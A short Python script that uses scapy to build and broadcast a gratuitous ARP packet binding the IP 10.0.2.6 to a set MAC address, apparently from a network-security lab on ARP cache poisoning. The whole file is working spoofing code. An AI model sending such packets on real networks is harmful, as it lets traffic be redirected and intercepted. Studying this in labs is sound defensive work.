#!/usr/bin/python3
from scapy.all import *

E = Ether(src='08:00:27:af:b1:f9', dst='ff:ff:ff:ff:ff:ff')
A = ARP(hwsrc='08:00:27:af:b1:f9', psrc='10.0.2.6', 
	hwdst='ff:ff:ff:ff:ff:ff', pdst='10.0.2.6')

pkt = E/A
pkt.show()
sendp(pkt)
